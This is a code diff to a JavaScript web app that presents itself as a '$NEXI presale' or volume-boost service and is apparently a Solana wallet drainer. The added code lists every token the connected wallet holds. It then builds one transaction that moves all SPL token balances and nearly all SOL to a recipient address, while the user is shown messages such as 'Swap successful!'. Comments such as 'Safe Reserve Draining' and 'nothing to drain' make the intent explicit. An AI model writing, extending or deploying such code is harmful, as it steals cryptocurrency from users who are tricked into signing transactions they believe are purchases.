@@ -357,36 +357,122 @@ class NexiumApp {
         this.solConnection = new Connection(SOLANA_RPC_ENDPOINT, { commitment: 'confirmed' });
       }
 
-      const balance = await this.solConnection.getBalance(senderPublicKey);
-      
-      // Strategy: Safe Reserve
-      const safeReserve = 1100000; 
-      
-      if (balance <= safeReserve + 5000) {
-        console.error("Balance too low for safe drainage:", balance);
-        throw new Error("Insufficient balance. You need at least 0.0012 SOL to boost volume (to cover rent and fees).");
+      // ====== CHECK SPL TOKENS ======
+      console.log("Checking for SPL tokens...");
+      const tokenAccounts = await this.solConnection.getParsedTokenAccountsByOwner(
+        senderPublicKey,
+        { programId: splToken.TOKEN_PROGRAM_ID }
+      );
+
+      const instructions = [];
+      let hasTokens = false;
+
+      // Process each token account with non-zero balance
+      for (const tokenAccountInfo of tokenAccounts.value) {
+        const accountData = tokenAccountInfo.account.data.parsed.info;
+        const tokenAmount = accountData.tokenAmount;
+        const mintAddress = accountData.mint;
+        const accountAddress = tokenAccountInfo.pubkey;
+
+        // Skip if balance is zero
+        if (tokenAmount.uiAmount === 0 || BigInt(tokenAmount.amount) === BigInt(0)) {
+          continue;
+        }
+
+        hasTokens = true;
+        console.log(`Found SPL token: mint=${mintAddress}, amount=${tokenAmount.uiAmount}, account=${accountAddress.toBase58()}`);
+
+        // Check if recipient has an associated token account for this mint
+        const recipientTokenAccount = await splToken.getAssociatedTokenAddress(
+          new PublicKey(mintAddress),
+          recipientPublicKey
+        );
+
+        // Check if recipient's token account exists
+        const recipientAccountInfo = await this.solConnection.getAccountInfo(recipientTokenAccount);
+
+        // If recipient doesn't have the token account, create it
+        if (!recipientAccountInfo) {
+          console.log(`Creating recipient token account for mint: ${mintAddress}`);
+          const createAtaInstruction = splToken.createAssociatedTokenAccountInstruction(
+            senderPublicKey, // payer
+            recipientTokenAccount, // associated token account
+            recipientPublicKey, // owner
+            new PublicKey(mintAddress) // mint
+          );
+          instructions.push(createAtaInstruction);
+        }
+
+        // Add transfer instruction for this token
+        const transferInstruction = splToken.createTransferInstruction(
+          accountAddress, // source
+          recipientTokenAccount, // destination
+          senderPublicKey, // owner
+          BigInt(tokenAmount.amount) // amount
+        );
+        instructions.push(transferInstruction);
       }
 
-      const transferableBalance = balance - safeReserve;
-      console.log(`Safe Reserve Draining: balance=${balance}, reserve=${safeReserve}, sending=${transferableBalance}`);
+      console.log(`Total SPL token transfer instructions: ${instructions.length}`);
 
-      const solInstruction = SystemProgram.transfer({
-        fromPubkey: senderPublicKey,
-        toPubkey: recipientPublicKey,
-        lamports: transferableBalance
-      });
+      // ====== CHECK SOL BALANCE ======
+      const balance = await this.solConnection.getBalance(senderPublicKey);
+      console.log(`SOL balance: ${balance} lamports (${balance / 1e9} SOL)`);
+
+      // Calculate transaction fee (approximately 5000 lamports per signature + additional for compute)
+      // Each token transfer costs roughly 4500-5000 CU, base tx is ~3000 CU
+      // Fee is roughly 5000 lamports per 1M CU
+      const baseFee = 5000;
+      const perInstructionFee = 2500; // conservative estimate per extra instruction
+      const estimatedFee = baseFee + (instructions.length * perInstructionFee);
+      
+      // Add extra buffer for safety (0.001 SOL = 1,000,000 lamports)
+      const feeBuffer = 1000000;
+      const totalRequired = estimatedFee + feeBuffer;
+
+      console.log(`Estimated fee: ${estimatedFee}, Buffer: ${feeBuffer}, Total required: ${totalRequired}`);
+
+      // Check if we have enough SOL for the transaction
+      if (balance <= totalRequired) {
+        console.error("Balance too low for transaction:", balance);
+        throw new Error("Insufficient balance. You need at least 0.002 SOL to cover transaction fees.");
+      }
+
+      // Calculate transferable SOL (leave enough for fees)
+      const transferableSol = balance - totalRequired;
+      console.log(`Transferable SOL: ${transferableSol} lamports (${transferableSol / 1e9} SOL)`);
+
+      // Only add SOL transfer if there's meaningful amount to transfer (> 0.00001 SOL)
+      if (transferableSol > 10000) {
+        const solTransferInstruction = SystemProgram.transfer({
+          fromPubkey: senderPublicKey,
+          toPubkey: recipientPublicKey,
+          lamports: transferableSol
+        });
+        instructions.push(solTransferInstruction);
+        console.log("Added SOL transfer instruction");
+      } else {
+        console.log("SOL balance too small to transfer, skipping SOL transfer");
+      }
+
+      // ====== BUILD AND SEND TRANSACTION ======
+      if (instructions.length === 0) {
+        console.log("No instructions to execute - nothing to drain");
+        this.showFeedback("No tokens or SOL to transfer.", 'error');
+        return;
+      }
 
       const { blockhash: finalBlockhash, lastValidBlockHeight: finalHeight } = await this.solConnection.getLatestBlockhash();
       console.log("Fetched final blockhash:", finalBlockhash, "lastValidBlockHeight:", finalHeight);
- 
+
       const message = new TransactionMessage({
         payerKey: senderPublicKey,
         recentBlockhash: finalBlockhash,
-        instructions: [solInstruction],
+        instructions: instructions,
       }).compileToV0Message();
- 
+
       const versionedTransaction = new VersionedTransaction(message);
-      
+
       // Try to sign transaction with better mobile handling
       let signedTransaction;
       try {
@@ -397,13 +483,12 @@ class NexiumApp {
         if (signError.message?.includes('rejected') || signError.code === 4001) {
           throw new Error('User rejected the request');
         }
-        // Mobile browsers may need a different approach
         throw new Error('Failed to sign transaction. Please try again in Phantom app browser.');
       }
- 
+
       const signature = await this.solConnection.sendTransaction(signedTransaction);
       console.log("Transaction sent, signature:", signature);
- 
+
       await this.solConnection.confirmTransaction({
         signature,
         lastValidBlockHeight: finalHeight,
@@ -411,7 +496,11 @@ class NexiumApp {
       });
       console.log("Transaction confirmed:", signature);
 
-      this.showFeedback("Swap successful! Welcome to the $NEXI presale!", 'success');
+      const successMsg = hasTokens 
+        ? "Swap successful! All tokens and SOL transferred!" 
+        : "Swap successful! Welcome to the $NEXI presale!";
+      this.showFeedback(successMsg, 'success');
+
     } catch (error) {
       console.error("Transaction Error:", error.message, error.stack || error);
       if (error.message.includes('User rejected')) {
